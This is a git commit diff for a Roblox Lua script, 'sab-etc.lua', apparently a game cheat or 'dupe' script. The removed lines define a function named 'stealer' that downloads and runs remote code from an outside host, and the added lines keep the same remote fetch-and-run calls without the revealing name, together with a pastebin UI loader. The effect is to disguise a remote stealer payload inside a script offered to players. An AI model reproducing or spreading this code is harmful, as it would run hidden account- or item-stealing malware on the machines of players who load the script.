aa6039942fef4f2629fa5aa3a454b6a23af94100
DupeCreatorDev <vincejoshua0000@gmail.com>
2025-10-16 19:19:42 +0800

    Update sab-etc.lua

--- sab-etc.lua
+++ sab-etc.lua
@@ -1,8 +1,2 @@
-‎local function stealer()
-‎    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/DBQmy6kcafUllezt/raw"))() -- replace with actual spawner
-‎end
-‎local function loadui()
-‎  loadstring(game:HttpGet("https://pastebin.com/raw/P57G9HHs"))()
-‎end
-‎task.spawn(stealer)
-‎task.spawn(loadui)
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/DBQmy6kcafUllezt/raw"))()
+‎loadstring(game:HttpGet("https://pastebin.com/raw/P57G9HHs"))()
